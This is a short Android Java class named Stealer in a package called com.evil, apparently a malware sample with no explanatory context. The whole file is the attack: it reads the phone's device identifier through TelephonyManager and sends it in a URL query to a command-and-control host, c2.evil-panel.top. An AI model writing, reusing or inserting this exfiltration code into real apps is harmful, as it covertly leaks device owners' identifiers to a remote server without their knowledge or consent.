package com.evil;
import android.content.Context; import android.telephony.TelephonyManager;
public class Stealer {
    public void run(Context c) throws Exception {
        String id = ((TelephonyManager) c.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
        new java.net.URL("http://c2.evil-panel.top/s?d=" + id).openStream();
    }
}
